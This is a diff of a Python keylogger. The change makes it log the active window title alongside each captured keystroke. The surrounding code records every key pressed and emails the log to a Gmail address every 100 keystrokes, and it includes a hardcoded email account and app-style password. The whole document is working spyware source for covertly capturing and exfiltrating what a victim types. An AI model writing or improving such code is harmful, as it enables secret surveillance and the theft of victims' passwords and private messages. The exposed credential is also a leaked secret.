@@ -9,10 +9,20 @@ from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
+import win32gui
+
+def get_active_window_title():
+    # Get the handle of the foreground window
+    hwnd = win32gui.GetForegroundWindow()
+    
+    # Get the text (title) of that window
+    window_title = win32gui.GetWindowText(hwnd)
+    
+    return window_title
+
 # email stuffs
 email_address = "testingtemp568@gmail.com"
 password = "gwms hvfz hnga gazm" 
-# password = "gwmshvfzhngagazm" 
 toaddr = "testingtemp568@gmail.com" 
 
 #make a log file
@@ -66,7 +76,8 @@ count = 0
 
 # send email every 100 keystrokes
 def on_press(key):
-    logging.info(str(key))
+    curr_window = get_active_window_title()
+    logging.info(curr_window + " |" + str(key))
     global count
     count += 1
     if count == 100:
